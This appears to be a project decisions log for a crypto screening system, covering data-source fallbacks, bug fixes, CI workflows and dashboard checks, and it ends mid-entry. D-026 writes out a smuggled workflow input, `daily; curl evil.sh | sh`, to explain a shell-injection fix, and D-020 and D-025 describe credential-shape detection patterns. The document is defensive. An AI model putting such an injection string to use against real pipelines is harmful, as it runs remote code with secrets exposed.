# Decisions

ADR-style log. Every design choice that a future reader might otherwise
second-guess, plus every threshold that fired on something we did not expect.

**Rule (guardrail 18.4):** if a threshold disqualifies an asset you believe in,
that is a finding to record here — not a bug to fix by loosening the threshold.

---

## D-001 — Disqualification-first architecture
**Date:** 2026-09-09 · **Status:** accepted

Layer 1 is a binary kill switch; Layer 2 only ever sees survivors. No score, no
partial credit, no override at Layer 1.

**Why:** seven case studies converge on the finding that the data which
disqualifies a bad candidate is available before the move and is almost never
chart data. A ranking system that lets a strong score rescue a failed supply
check reintroduces exactly the failure mode being guarded against.

---

## D-002 — Derivatives are a risk check, never a buy trigger
**Date:** 2026-09-09 · **Status:** accepted

OI, funding and CVD appear in L1 (as kill switches) and L3 (as advisory risk
checks). They never generate a candidate.

**Why:** in the TRB case a sophisticated on-chain account publicly read negative
funding as bullish hours before a −78% collapse. These metrics identify
fragility, not direction.

---

## D-003 — Local sqlite3 + Turso via one adapter
**Date:** 2026-09-09 · **Status:** accepted

`src/db/connection.py` selects the backend from `TURSO_DATABASE_URL` alone.
Callers never know which is in use.

**Why:** CI has no persistent filesystem, local dev wants a file. Two code paths
would drift. Consequence: no SQLite feature libSQL lacks may be used.

---

## D-004 — Append-only enforced by database triggers, not convention
**Date:** 2026-09-09 · **Status:** accepted

`journal_entry` rejects DELETE and UPDATE. `forward_return` rejects DELETE.

**Why:** deleting an inconvenient journal row is the exact mechanism by which
every signal channel comes to look profitable. A rule enforced only by
discipline is a rule that will be broken at the moment it costs something.

---

## D-005 — `table_stats` row counts are approximate by design
**Date:** 2026-09-09 · **Status:** accepted

Counts increment on write, including on an upsert that overwrites an existing
row. So `table_stats.row_count` is a growth indicator, not a census.

**Why:** Turso meters ROW READS. `SELECT COUNT(*)` over `derivatives_snapshot`
reads every row and would burn the free allowance to answer a cosmetic question
on the Health page. The Health page labels the number as approximate.

---

## D-006 — respx instead of `responses` for HTTP mocking
**Date:** 2026-09-09 · **Status:** accepted

**Why:** the spec named `responses`, which mocks `requests`. This project uses
`httpx` (chosen for async). `respx` is the httpx-native equivalent. Recorded per
operating rule 8 (trust reality over the document).

---

## PENDING — items that need the user, not code

| Item | Needed for | Record here when done |
|---|---|---|
| Fine-grained PAT expiry date | Phase 10 autonomy | Expiry: `________` (set calendar reminder 7 days prior) |
| Turso free-tier limits as read on the vendor page | R8 | |
| Repo visibility choice (public recommended) | Actions minutes | |
| Oracle Cloud / Pi availability for Tier A | Optional 5-min tier | |

---

## D-007 — Source-level unavailability is not the same as asset-level missing data
**Date:** 2026-09-09 · **Status:** accepted · **Deviates from a literal reading of spec §9**

Spec §9 says: *"If a check's input is unavailable, do not silently pass. Emit
`CheckResult(passed=False, reason='data_unavailable')` and count it as a FAIL.
A screener that cannot see is a screener that should say no."*

That rule is right for a **per-asset** gap and wrong for a **source outage**.

**What forced the decision:** every free unlock source is now paywalled.
`api.llama.fi/emissions` and `/emission/{protocol}` both return `402 Upgrade to
the paid API plan` (verified 2026-09-09). With no unlock data at all, a literal
reading fails `L1_UNLOCK` for 100% of the universe, the survivor rate goes to
zero, and the system produces nothing — while also violating the Phase 4
acceptance criterion that survivors land between 20% and 50%.

**What the code does instead.** Each check reports coverage across the universe:

- Coverage **above** `min_source_coverage` → the check is live, and an
  individual asset with missing data FAILS, exactly as the spec requires. No
  silent passes.
- Coverage **below** it → the check is marked `source_unavailable`, excluded
  from that day's verdict, and reported loudly: in `check_values`, in the daily
  report's data-quality section, and on the Health page.

The distinction that matters: a missing value for one asset is evidence about
that asset. A missing value for every asset is evidence about our pipeline, and
disqualifying the whole market for our own outage is not a judgement about the
market.

**What keeps this honest:** an unavailable check is never invisible. If
`L1_UNLOCK` is dark, the report says so on the day it happens, so a survivor
list is never mistaken for one screened on a complete rule set.

**Consequence to accept:** while unlock data is unavailable, the highest-value
check in the system is not running. `config/unlock_calendar.yaml` exists so
known events can be entered by hand with an honest `first_seen_utc`, and the
proper fix is a paid unlock source when the project justifies one.

---

## D-008 — DefiLlama emissions moved behind a paywall
**Date:** 2026-09-09 · **Status:** recorded · **Answers R4**

`GET https://api.llama.fi/emissions` → `402`. Same for `/emission/{slug}` and
`/emissionsBreakdown`. TVL, fees and revenue endpoints remain free and are
still used for the L2 fundamental block.

Unlock sources are therefore a chain, tried in order and degrading gracefully:
CoinGlass (paid, if a key exists) → DefiLlama Pro (if a key exists) → the
manual `config/unlock_calendar.yaml` → nothing, which triggers D-007.

---

## D-009 — The liquidation trigger is a RATIO move, not a percentage move
**Date:** 2026-09-09 · **Status:** accepted · **Corrects a flaw in the spec's threshold**

**The spec said:** evaluate `L1_MCAP_LIQ` "during any 24h move >100%".

**The flaw:** a price cannot fall more than 100%. Written as
`abs(price_change_24h_pct) > 100`, the trigger can only ever fire on an UPWARD
move. RAVE fell about 96% — the exact event this check exists to detect — and
would have been recorded as "not applicable" and skipped.

The regression test `test_rave_liquidation_ratio_is_the_signature` caught it:
the check returned `passed=True, reason='not applicable: 24h move under 100%'`
on the RAVE collapse itself.

**What the code does now.** The trigger is expressed as a ratio move, so that a
doubling and a halving count as the same size of event in opposite directions:

```
ratio_move   = 1 + pct_change/100
up_trigger   = 1 + trigger        # 2.0   at trigger = 1.0
down_trigger = 1 / up_trigger     # 0.5   at trigger = 1.0
fires when ratio_move >= 2.0 or <= 0.5
```

RAVE at −96% gives `ratio_move = 0.04`, which fires. A +150% move gives 2.5,
which also fires. A +40% move gives 1.4, which does not.

**Why it matters beyond this one case:** the asymmetry would have silently
removed every crash from the check's coverage while leaving it looking
operational, and the check's whole purpose is detecting a collapse whose market
cap loss is impossible against its liquidation volume. It would have failed
exactly when it was needed.

---

## D-010 — the horizon price lookback may not reach the signal day

**Status:** fixed in code. Found by a Phase 6 test, not by review.

`_price_at()` resolved "the price at the horizon" as the closing price on the
target date, or the nearest earlier day within a week. The week of tolerance is
there for a good reason: one missed collection day should not permanently void
an entry's 30-day return.

**The defect.** The tolerance was a flat seven days regardless of horizon. At
the 1d horizon the target date is `run_date + 1`, so a week of lookback reaches
back to `run_date - 6` — including the signal day itself. With no price yet
collected for the day after the signal, the query happily returned the ENTRY
price, and the computed 1-day forward return was exactly 0.000000.

`test_missing_future_price_leaves_the_row_pending` asserted zero rows written
and got four.

**Why this was worse than a crash.** A missing return is visible: the entry
stays pending and the report says how much data is short. A 0.00% return is
invisible — it enters the statistics as a real observation, and because
`forward_return` is append-only it could never be corrected. Every 1d
horizon would have been silently pulled toward zero, and the more reliable the
collector, the *less* often it would happen — so the corruption would have been
worst in exactly the early period when the sample is smallest.

**What the code does now.** The caller passes an explicit floor:

```
earliest = max(add_days(target_date, -7), add_days(run_date, 1))
```

so the lookback keeps its week of slack at long horizons and collapses to the
exact day at 1d, where there is no slack to give. `_price_at` returns `None`
when `earliest > date`, and the entry stays pending.

**Rule this generalises to:** a tolerance window expressed in absolute days is
wrong whenever it is compared against an interval that can be shorter than the
window. Bound it by the interval, not by a constant.

---

## D-011 — the rejection wall is ordered by market cap, not by a shadow L2 score

**Status:** deliberate deviation from spec 14 and 16.3.

Both spec sections ask for disqualified assets ordered by "what its L2 score
would have been". That number cannot be produced honestly.

Layer 2 is a **cross-sectional** ranking: every block score is a percentile
within the day's scored population. So a score for a disqualified asset
requires one of:

1. **Admitting it to the cross-section.** This changes every survivor's
   percentile, which means the published ranking would depend on the rejects —
   the exact coupling the disqualification-first architecture exists to remove.
2. **Scoring it against a population it is not in.** Defensible arithmetic, but
   the resulting number is not comparable to any survivor's score while looking
   exactly like one. On a page whose purpose is showing what the filter
   removed, a number that invites "but it scored 74, higher than #3" is worse
   than no number.
3. **A second, separate scoring pass.** Same problem as (2), plus a second code
   path through the scorer that no test covers as production behaviour.

**What the code does instead.** Rejected assets are ordered by market cap
descending, within groups by the check that killed them. This serves the page's
actual purpose better: the biggest name the filter removed is the one the
operator is most likely to believe it got wrong, and therefore the row that
most needs to show its computed value against its threshold. On 2026-09-09 the
top row was XMR at $9.6B, disqualified on a perp/spot volume ratio of 87.7x
against a threshold of 40 — a rejection worth understanding, and one that a
score-ordered list would have buried.

The markdown table additionally sorts assets failing a **single** check ahead of
those failing several: one failed check is the asset that came closest to
surviving, which is where a mis-calibrated threshold surfaces first.

**The invariant that matters:** no ordering heuristic anywhere can promote a
disqualified asset. L1 remains a binary kill switch with no override.

---

## D-012 — two publish-boundary defects found by running the publisher

Both were found by inspecting real output rather than by review, and both would
have been invisible until the dashboard existed.

**1. `float("inf")` serialised as a bare `Infinity`.**

An orphan perp — a perpetual with no same-venue spot pair — deliberately gets a
perp/spot ratio of `float("inf")` rather than `None`, because "no spot pair"
is an infinite ratio and recording it as missing would let it pass a check it
must fail. 163 of 528 contracts were orphans on 2026-09-09.

`json.dumps` accepts non-finite floats by default and emits `Infinity`, which is
**not valid JSON**. `JSON.parse` throws on it. Every asset page for an orphan
perp, plus the entire rejection wall, would have failed to load — on precisely
the assets the check exists to catch — with a parse error and no indication of
the cause.

Fixed by `_json_safe()`: non-finite values cross the boundary as the strings
`"Infinity"` / `"-Infinity"` (NaN becomes `null`), and the writer passes
`allow_nan=False` so anything the sanitiser misses raises instead of shipping
an unreadable file. A test parses every published file with `parse_constant`
set to fail.

**2. Filename sanitising was not injective.**

`_safe_name()` replaced unsafe characters to keep a ticker from escaping the
assets directory. Binance lists five CJK-named contracts; all five sanitised to
`unknown.json`. Four assets were silently overwritten, and the dashboard would
have shown one asset's verdict under five different tickers.

Path safety and uniqueness are two requirements, and a substitution only
satisfies the first. An already-safe ticker now keeps its own name
(`BTC.json`, `1000PEPE.json`); anything altered gets a stable hash suffix, and
`manifest.json` publishes the ticker → filename map, because a name the
dashboard cannot reverse is a link it cannot build.

---

## D-013 — a row is not a measurement

The data-quality section originally counted rows per input table. Two of its
figures were actively misleading on the first real run:

* `fundamentals_snapshot` read **100%** of the universe. The DefiLlama
  collector writes a row for every asset with `has_fundamentals = 0` where no
  protocol is mapped: 657 rows, of which **13** carried a fundamental. An
  operator reading 100% would trust the fundamental block; it was fed for 2.3%
  of the universe, which is why every `Fund` cell in the top 15 is blank.
* `market_snapshot` read **230.7%**, because CoinGecko covers 1,218 assets and
  only 528 of them have a perp. A coverage figure above 100% is not a rounding
  artefact — it is the wrong question.

Coverage is now (a) intersected with the day's screened universe and (b)
per-table explicit about what counts as measured (`has_fundamentals = 1`,
`top10_share IS NOT NULL`, and so on). Both figures are reported side by side —
`Measured` and `Rows` — so the gap between them is visible rather than
resolved in favour of the flattering number.

Related, same section: `collector_run.status` has three values, and `partial`
means the collector ran and degraded gracefully around an unconfigured optional
source. Bucketing `partial` with `failed` reported five working collectors at
0% success and would have sent the operator chasing an outage that did not
exist. Failures and degradations are now counted and reported separately.

---

## D-014 — a break needs a recency bound, or a setup is just history

**Status:** fixed in code; new threshold `layer3.max_bars_since_break`.

`detect_break` scans forward from the trendline's last touch to the end of the
series, so it returns the first close above the line at any point in the
available history. On the first live Layer 3 run over the 2026-09-09 ranking:

| Asset | Break date | Weekly bars ago | Reported as |
|---|---|---:|---|
| MINA | 2026-03-02 | 27 | live setup, invalidation 0.05235 |
| IOST | 2026-02-09 | 30 | live setup, invalidation 0.001177 |

Both were being published as current setups carrying invalidation levels from
six and seven months earlier. Position sizing divides by exactly that number,
so a stale level does not degrade gracefully — it produces a confidently wrong
position size.

A setup is a present-tense claim. Beyond `max_bars_since_break` (8 weekly bars,
~2 months) the break is recorded as structure with `setup_type =
"break_stale"`, `setup_detected` false, and a note stating its age. The
structure is not deleted — it is context — but it is not reported as
actionable.

**Second finding from the same run: "no retest yet" was misleading.** It
implies one may still come. But a descending line keeps descending while price
holds above it, so beyond a certain gap a retest can never occur. ICP sat 104%
above its broken line: telling the reader to wait for a retest would have meant
telling them to wait forever. The note now distinguishes *pending* from
*impossible*, and says which.

**Third: unmeasured depth was invisible.** A missing depth reading appeared
only in the prose notes, so `risk_flags` came back empty and every consumer
that renders flags — the report table, the dashboard, the journal's stored
`layer3_values` — showed the asset as carrying no risk. Unknown is not
acceptable, and it now has to look it: `L3_DEPTH_UNKNOWN` is a flag.

---

## D-015 — CVD is not implemented, and is not stubbed with a proxy

Spec 12.2 lists "spot CVD vs perp CVD" among the positioning-risk metrics.
It is not implemented, and `cvd_divergence()` returns
`{"available": False, "reason": ...}` rather than a number.

Cumulative volume delta needs per-trade data with an aggressor flag. This
project collects snapshots, not trade streams, so the input does not exist.

The available substitute — inferring buy and sell pressure from where a bar
closed inside its range — is not CVD. It is a deterministic function of the
price move it is supposed to explain, so it would confirm whatever the chart
already showed while carrying the authority of a microstructure metric. That is
strictly worse than an honest gap: a missing metric prompts a question, and a
circular one ends the inquiry.

The spec's own caveats bound how much the real thing would be worth here, and
they are recorded in the function's docstring: without an aggressor flag, tools
fall back on the tick rule, which degrades badly in fast markets; CVD works
poorly on thin altcoin perps, which is exactly this universe; and divergence
can persist through an entire trend, so it is not a reversal timer.

**To implement properly** would mean a trade-stream collector (Binance
`@aggTrade` websocket, or the `/fapi/v1/aggTrades` REST endpoint polled per
symbol), a new table, and a storage budget measured in millions of rows per
day. That is a project of its own, and it is not on the critical path to the
first honest backtest.

---

## D-016 — the klines collector, and why it is the only one that backfills

Every other collector in this system can only record the present, because the
free APIs it reads do not serve history: Binance keeps 30 days of open
interest, Coinalyze deletes intraday data daily. A day not collected is a day
that can never be backtested.

Binance klines are the exception — they reach back years — which makes this the
one collector that can make the dataset older than the project. Two things were
blocked on it:

* **Layer 3** needs swing highs across months and a close-confirmed break. A
  table of today's prices cannot produce either.
* **The journal's excursions** need each day's high and low. The CoinGecko
  snapshot carries a close only, so before this collector every excursion
  silently degraded to a close-to-close range — understating the drawdown that
  decides whether a trade was survivable.

Backfilled 356,358 daily bars across 528 symbols, 2023-09-06 to 2026-09-09.

**The multiplier bug this surfaced.** `parse_symbol` normalises
`1000PEPEUSDT` to base asset `PEPE`, and `price_daily` is keyed on
`(snapshot_date, base_asset)` — so the raw close landed under `PEPE` at 1000x
the real price, in the same column CoinGecko writes at 1x.

What made this dangerous is that it looked harmless. Returns computed inside a
single source survive a constant scale factor: the journal's percentages were
all correct. But one day where klines is missing and CoinGecko is not produces
a 1000x step between consecutive rows — a fabricated +99,900% forward return,
written into an append-only table, against a real journal entry. Prices are now
divided by the contract multiplier at the boundary (quote volume is not, being
already USD notional), and PEPE cross-checks to within 4% of CoinGecko's
independent price, which is the expected gap between a UTC daily close and a
live snapshot.

---

## D-017 — the harness replays recorded rankings; it does not re-screen history

The obvious way to backtest is to loop over dates and call `run_screen(date)`
for each. It is wrong, and the reason is worth stating because the code looks
correct.

L1 and L2 read `fundamentals_snapshot`, `holder_snapshot`, `supply_metrics` and
`scheduled_event`. Those tables are **revised after the fact**: DefiLlama
restates revenue, holder distributions change as the chain advances, and unlock
calendars are corrected. Re-screening 2026-03-01 today would score assets using
the September versions of those rows — information that did not exist in March.
The result is a backtest of hindsight, and it would look excellent.

So the harness reads `layer2_result` rows **as they were written on the day**,
and a date with no recorded ranking is a date it skips. This is why
`MIN_SCREENING_DAYS` exists at all: the constraint is not compute, it is that
the ranking has to have been recorded live. There is no way to shortcut it, and
that is the point.

The one thing the harness does recompute is the regime label, from
`price_daily` rather than from `market_regime`. That is safe — a 30-day BTC
return is not revised — and necessary, because the regime collector did not run
on every day and silently dropping those days would test a different sample.

---

## D-018 — the holdout audit log was itself defeatable

`record_holdout_run` exists so that "test once on the final third" is enforced
rather than promised: every holdout run is logged and the harness reports the
count back, so a fourth-attempt result cannot later be presented as
out-of-sample.

The first implementation stored the record via
`deterministic_id("holdout", start, end, utc_now_iso())`. `utc_now_iso()` has
second resolution, so two holdout runs inside the same second produced the
**same** id, the upsert replaced the row, and the counter stayed at 1.

`test_a_second_holdout_run_is_labelled_as_no_longer_out_of_sample` caught it:
expected 2, got 1.

An audit log whose rows can overwrite each other is not an audit log. There is
now a dedicated `backtest_run` table with a random `uuid4` primary key, and a
test asserts three consecutive recordings count 1, 2, 3.

The general lesson, which applies to more of this project than this one
function: a deterministic id is right for *idempotent data* — re-fetching the
same bar must not duplicate it — and wrong for an *audit record of a distinct
event*. Those are opposite requirements and they were being served by the same
helper.

---

## D-019 — slippage with no recorded depth costs the full band, not zero

`slippage_cost` returns the full 2% band when `depth_snapshot` has nothing for
the asset. The tempting default is 0.0, and it is the single most consequential
sign error available in a cost model: it would make the *least* liquid assets —
the ones with no depth measurement precisely because nobody collected a book
for them — the *cheapest* to trade in the backtest. The strategy would then
appear to earn its return from exactly the assets it could never have exited.

Same reasoning as `L3_DEPTH_UNKNOWN`: unknown is not acceptable, and in a cost
model the honest direction for an unknown is expensive.

The model is deliberately crude and pessimistic: a position inside the recorded
±2% bid depth pays proportionally, and anything beyond it pays the band again
for the excess. It is a floor on the true cost, not an estimate of it. Spec 13
makes a non-trivial cost drag an acceptance criterion, and the test asserts
drag > 1% of gross movement — because a cost model that rounds to zero is a
cost model that is not applied.

---

## D-020 — the spec's own secret-scan criterion cannot pass, so the gate uses shapes

Spec 16.4 lists this acceptance criterion:

```
grep -ri "api_key\|secret\|token" web/dist/   returns nothing
```

It can never pass on any React application. Run against the real bundle it
matches twice, and both are false positives:

* `React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED` — React's own
  export name, present in every React build ever produced.
* `"magnitude_tokens"` — a field name in our own `events.json`.

A gate that always fails is a gate somebody disables, and a disabled gate is
worse than no gate because everyone still believes it is there.

Both gates — `publish.py` before it writes, and `build-site.yml` before it
deploys — therefore match key **shapes**: `github_pat_…`, `ghp_/gho_/ghu_/ghs_/ghr_…`,
`hc-ping.com/<uuid>`, `authToken=`, a Telegram `bot<digits>:<secret>`, and
`api_key`/`auth_token`/`bot_token` followed by an assignment and 16+ credential
characters. Verified both ways: the patterns catch a synthetic leak file
containing a PAT, a healthcheck URL and an assigned API key, and pass cleanly
on the real bundle and the real `data/public/`.

The same reasoning already applied once, to `publish.yml`, whose original
pattern included the bare word "secret". Our JSON embeds news headlines, so a
single article with "secret" in the title would have failed the deploy every
day until the story aged out, for a reason no error message explained.

**The general rule:** a secret scanner matches the shape of a credential. A
scanner that matches the *vocabulary* of credentials produces false positives
in proportion to how much English the payload contains — and this payload
contains headlines.

---

## D-021 — the dashboard's mobile table is stacked, not side-scrolling

Spec 16.4 requires that at 375px "the screen table becomes stacked rows, not a
horizontal scroll". The first implementation put every table in an
`overflow-x-auto` container, which keeps the page body from scrolling
horizontally — necessary, but not the same thing. Measured at a 375px viewport:
the wrapper's `scrollWidth` was 768 against a `clientWidth` of 375.

For most tables a side scroll is fine. For the ranked table it is not, and the
reason is what the columns carry: rank and ticker fit on screen, and the six
block scores — the entire argument for the ranking — sit off the right edge. A
reader on a phone would see an ordered list of tickers and never learn that the
justification existed.

So `TableWrap` gained a `narrow="hide"` mode used by exactly one table, and the
ranked rows render below `sm` as stacked blocks with the six blocks in a 3×2
grid. Verified at a 375×812 emulated viewport: the table is not rendered, the
stacked list shows 15 items, `document.body.scrollWidth` does not exceed the
viewport, and no visible container scrolls horizontally.

Measured at the same time, for the record: Lighthouse accessibility 100, best
practices 100, SEO 100 (criterion was ≥90); bundle 68.1 KB gzipped against a
500 KB budget; `/#/asset/ICP` survives a hard refresh, which is what HashRouter
is for.

**A separate legibility fix from looking at the render.** The funnel drew a `→`
three pixels to the left of each figure. At that size, against a tabular
numeral, the arrow reads as a minus sign — so the disqualified count rendered
as "−321". Wrong, and alarming, on the one number the page most wants
understood. The arrows now sit centred in a wider gutter.

---

## D-022 — Missing unlock data no longer scores as the best possible case
**Date:** 2026-09-10 · **Status:** accepted

`days_to_next_major_unlock` is null for two opposite reasons: we hold a vesting
schedule and there is no cliff ahead (the best case in the events block), or we
hold no unlock record at all (we know nothing). The events block filled both
with `9999` and percentiled the result, so every asset we had no supply data
for landed in the top percentile for unlock distance.

The code carried a comment justifying it — that L1 had already required event
data. It had not. `L1_UNLOCK` returns `_unknown()` when `has_event_data` is
false, and an unknown check passes; the same run that found this reported
`L1_UNLOCK coverage=0.4%`, so the dark branch was the common case, not the
exception. A load-bearing assumption stated in a comment and contradicted by
the code it defends.

`EventFeatures` now exposes `has_unlock_record` (narrower than `has_event_data`:
an asset with a mainnet date on file but no vesting schedule has event data and
still nothing to say about its next cliff). Only assets with a real unlock
record get the top-of-range treatment; the rest score `None` and the weight
redistributes across the metrics that were measured.

**On today's data this changes no ordering**, because unlock coverage is 0.4%
and the metric was uniform either way. It matters at partial coverage — which
is the state the system is heading towards — where the old code would have
ranked the assets it knew least about highest.

---

## D-023 — Sector relative strength requires its benchmark
**Date:** 2026-09-10 · **Status:** accepted

With BTC's return missing, `score_sector` substituted the cross-sectional mean.
That silently redefines the metric: sector strength against the screened
universe is a different quantity from sector strength against BTC, and BTC is
not even in the pool being averaged. The label `sector_rs` stayed the same, so
nothing downstream could tell which of the two it was looking at.

A missing benchmark now yields `NaN` for the window, logs
`sector_rs_no_benchmark`, and the block renormalises over whatever else was
measured. Nothing claims to be a BTC comparison that is not one.

---

## D-024 — An unscorable asset is omitted from the ranking, not scored zero
**Date:** 2026-09-10 · **Status:** accepted

`_clean(row["total_score"]) or 0.0` collapsed a null total to `0.0`. Since
`layer2_result.total_score` is `NOT NULL` the choice is between omitting the
row and inventing a number, and inventing one is worse than it first appears:
the row then occupies a rank, enters the journal as a signal, and its forward
return is attributed to a score that was never computed.

`run_layer2` now skips such rows and logs `layer2_unscorable_assets` with the
count and the tickers. `_build_entry` refuses a *signal* with a null score for
the same reason, one layer further on — `journal_entry` is append-only and
defended by triggers, so a fabricated score written there can never be
corrected. A *control* keeps its explicit `rank 0 / score 0.0` sentinel, which
is a statement that it was never ranked, and is the whole point of it.

Reachable today? No: the boolean event flags always produce a measurement, so
no asset totals `NaN` on the live universe (`unscorable=0`). Fixed anyway,
because the guard costs nothing and the failure it prevents is unrecoverable.

---

## D-025 — A credential is redacted by shape, not only by field name
**Date:** 2026-09-10 · **Status:** accepted

A security pass found a live leak path. CryptoPanic takes its auth token as a
URL **query parameter**; httpx builds its exception message from the full
request URL; and the collector logged `error=str(exc)`. `_redact_secrets`
inspected field *names* only, and the field was called `error` — so the token
would have ridden into a JSON log that CI uploads as an artifact from a public
repository.

Three independent layers now:

1. `redact_url()` + `PermanentHTTPError` in `collectors/base.py`, replacing
   `response.raise_for_status()`. The query string never enters the exception.
2. `_SECRET_VALUE_PATTERNS` in `logging_setup.py`: a second pass over every
   string **value**, so a credential is caught whatever field it sits in.
3. `scrub_secrets()` applied where `collector_run.error_message` is *built*,
   not where it is logged — because that column is republished in
   `data/public/health.json` and reaches a public page without passing through
   the log processor at all.

**A bug found while fixing the bug, worth recording on its own.** The Telegram
bot-token pattern was written into the file as a literal backspace byte where
`\b` was intended. It compiled without complaint and matched nothing. A
redactor that silently fails to redact is worse than none, because it is
trusted; the seven-shape verification that caught it is now
`tests/test_secret_redaction.py`.

---

## D-026 — A dispatch input never reaches a `run:` block
**Date:** 2026-09-10 · **Status:** accepted

`run: python -m src.cli collect ${{ inputs.tier }}` substitutes the input into
the shell script *before* the shell parses it, so `daily; curl evil.sh | sh`
executes as two commands with every job secret in scope. Quoting the expression
does not help — the value can contain quotes. Four sites were affected
(`collect-daily.yml` twice, `collect-hourly.yml`, `screen.yml`).

Every input is now bound under `env:` and read as `"$VAR"`, where it is data
the shell never re-parses. `screen.yml` uses an `if [ -n "$RUN_DATE" ]` branch
so the empty case is a genuinely absent flag rather than an empty `--date`.

The unsafe form reads more naturally than the safe one, so it will come back:
`ci.yml` gained a guard alongside the `on: schedule` one. Verified both ways —
it passes on the current tree and fails on a tree with the interpolation
re-introduced.

---

## D-027 — `rollback()` is a no-op on Turso, and says so
**Date:** 2026-09-10 · **Status:** accepted

The libSQL HTTP client autocommits every `execute` and every `batch`, so there
is no open transaction for `commit()` or `rollback()` to act on. A pipeline
that fails halfway leaves its earlier writes **committed** on Turso while the
same failure on local sqlite rolls the whole run back. The two backends do not
behave the same.

Not papered over with a fake transaction, because the real mitigation is
already in place and is stronger: every writer goes through `upsert()`, keyed on
`(run_date, base_asset)` or the table's natural key, so re-running a failed day
overwrites partial rows rather than appending duplicates — which is exactly
what the external cron does anyway. `journal_entry` is the one table not
covered by that argument, and it is append-only with a deterministic
`entry_id` written `INSERT OR IGNORE`, so it heals on re-run without mutating
anything already recorded.

`rollback()` now logs `rollback_unavailable` on the libSQL backend, and its
docstring states the constraint plus the one rule that follows from it: a
future table that is neither idempotent on re-run nor append-only must not
depend on this method.

---

## D-028 — Coverage reports the snapshot the screen actually used
**Date:** 2026-09-10 · **Status:** accepted

`_coverage` counted rows where `snapshot_date = run_date`. But `load_snapshots`
and `load_scoring_frame` both resolve `MAX(snapshot_date) <= run_date`, so a
day where collection has not yet run is screened on yesterday's rows —
deliberately. The report therefore printed 0% coverage for every input table on
a run that had just ranked 207 assets, which reads as a total collection
outage.

This is the same "two different zeroes" confusion the dashboard already guards
against on the funnel: *nothing was collected* and *today's ranking was built
on older data* are different problems with different responses, and a single
0% cannot distinguish them.

Coverage now resolves the same date the screen resolved, reports it as `as_of`
with an `age_days`, and shows an em dash where a table holds nothing at all.
The same run then reads honestly: market 86.2% at 1d, derivatives 100% at 1d,
fundamentals 2.3% at 1d, and holder/supply/attention genuinely empty.

---

## D-029 — The report says which blocks separated nothing
**Date:** 2026-09-10 · **Status:** accepted

Coverage answers "was there a row". It does not answer whether a block
distinguished one asset from another, and the two come apart badly and quietly.
Today's run is the example: the events block scored an identical 50.0 for all
207 survivors, and the attention block was not scored at all — 25 of 110
weight, 23%, contributing no information.

A constant changes no ordering, so nothing looks wrong anywhere. But the reader
believes six things were weighed when four were, and the score's apparent
precision is borrowed from blocks that said nothing.

Reported, never corrected: `data_quality()` gained `blocks` (weight, assets
scored, distinct values, `informative`), rendered in the daily report and on
the dashboard's Health page. Renormalising a zero-variance block away would be
a threshold change, and per guardrail 18.4 those are recorded decisions rather
than silent adjustments.

---

## D-030 — CLS: 0.05 measured in the browser, 0.97 in Lighthouse's simulation
**Date:** 2026-09-10 · **Status:** accepted, with a known limitation

A performance trace of the built site reports CLS **0.0465** — inside the
"good" band (≤0.1). Lighthouse reports 0.97 for the same build. The difference
is Lighthouse's *simulated* throttling (562 ms request latency, 4x CPU): under
that model the JSON and the web fonts land long after first paint, and the
footer travels most of a page height when the content finally renders.

Two shifts are real, per the trace: the footer moving as content arrives
(0.0453) and the Inter / IBM Plex Mono swap (0.0012). `<main>` gained a
`min-h-[70vh]` floor, which helps and costs nothing.

Not done, deliberately: eliminating the font shift needs `font-display:
optional` or a system-font stack, both of which change how the page looks on a
first visit. That is a design decision rather than a metric fix, and it is
recorded here rather than made quietly. Accessibility, best practices and SEO
all measure 100.

**A smaller thing fixed while measuring:** every page load took a 404 on
`/favicon.ico`. Harmless, but it is noise in exactly the console a reader would
check first when something looks wrong. Now an inline SVG data URI — no extra
request, no committed binary.

---

## D-031 — the trigger-lag input is a time of DAY, not an instant

**Date:** 2026-09-10 · **Status:** accepted

`record_lag` originally expected `scheduled_for` to be a full UTC ISO instant,
as the runbook's example JSON showed. cron-job.org cannot send that. Its
request body is a fixed string with no templating and no variables, so the
instant would have been correct on the day it was pasted and then wrong by one
more day every day. Within a week the Health page would have been plotting a
lag of ~600,000 seconds and calling it a measurement.

The input is now the intended fire **slot**, which for a fixed cron entry
genuinely is constant: `"03:10"` for a daily job, `":25"` for an hourly one.
`resolve_scheduled` walks that slot back to its most recent occurrence at or
before the actual start. A full ISO instant is still accepted for manual
dispatch and for tests.

A 120-second skew tolerance absorbs the case where cron-job.org's clock is a
hair ahead of GitHub's. Without it, firing two seconds "early" would roll the
candidate back a whole period and record a 24-hour lag — setting off precisely
the alarm this metric exists to raise, for the one reason that is not a problem.

`journal.yml` had declared the `scheduled_for` input since Phase 10 and never
used it. An input that silently does nothing is worse than no input: the
operator configures it, sees a 204, and believes lag is being measured on a job
where it is not. It now records lag like the two collectors.

---

## D-032 — the dashboard rebuild hangs off `workflow_run`, not the data commit

**Date:** 2026-09-10 · **Status:** accepted

`build-site` triggered on `push` to `data/public/**`. `publish` writes that
directory and commits it with `GITHUB_TOKEN` — and GitHub deliberately raises
**no** `push` event for a `GITHUB_TOKEN` commit, to stop a workflow retriggering
itself forever.

So the chain ended at `publish`. Data would have landed in the repo daily and
the site would have rebuilt only when a human pushed `web/**`. The failure is
the bad kind: nothing errors, no alert fires, and the dashboard shows a
confident, well-formed, increasingly old screen — the exact stale-dashboard
failure the 26-hour age banner exists to catch, arriving by a route the banner
does not cover, because the banner is baked into the stale bundle.

`build-site` now also triggers on `workflow_run` after `publish` completes, and
the build job is guarded on `conclusion == 'success'` so a failed publish never
deploys. The `push` trigger stays for human pushes, which carry a real actor's
token and do raise the event.

---

## D-033 — The healthcheck guard moved out of `if:` and into the shell

Every pinging workflow carried `if: success() && env.HC != ''` with `HC` bound
in that same step's `env:` block. A step's own `env:` is **not** in scope for
that step's `if` expression — only workflow-level and job-level env is, because
those are bound at workflow initialisation and the step's are not. So `env.HC`
resolved to empty, `'' != ''` was false, and the ping step was skipped on every
run of all four workflows.

This is the worst shape a bug can take in this system. GitHub reports the job
green and the step "skipped". healthchecks.io reports `Last Ping: Never`, which
is indistinguishable from a wrong UUID or a missing secret — so the obvious
response is to re-copy the UUID, watch it stay grey, and eventually delete the
check. The monitoring layer would have been dismantled by hand, in good faith,
because it appeared to be the thing that was broken.

The guard now runs in the shell (`if [ -z "$HC" ]`). `if: success()` stays: a
failed job must send nothing, because the missed ping is the entire signal and
is the one failure cron-job.org structurally cannot see, having already had its
204 the moment the workflow was queued.

Verified against GitHub's context-availability rules rather than assumed; the
docs list `env` as available in a step `if` without stating the scope, which is
